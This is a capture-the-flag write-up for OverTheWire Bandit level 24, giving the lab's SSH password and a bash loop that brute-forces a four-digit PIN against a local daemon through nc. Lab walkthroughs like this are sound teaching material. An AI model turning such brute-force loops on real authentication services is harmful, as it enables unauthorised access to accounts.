# Bandit Level 24 → Level 25


# Goal
> A daemon is listening on `port 30002` and will give you the password for bandit25.
-  if given the password for bandit24 `and` a secret numeric 4-digit pincode. 
- There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
- You do not need to create new connections each time.


## SSH
```bash
password : gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
ssh bandit24@bandit.labs.overthewire.org -p 2220
```


# Solution
![level 24](/image/level24.png)

```bash
#!/bin/bash
{
  for i in $(seq -w 0000 9999)
  do
     echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
  done
} | nc localhost 30002

```
![level 24II](/image/level24II.png)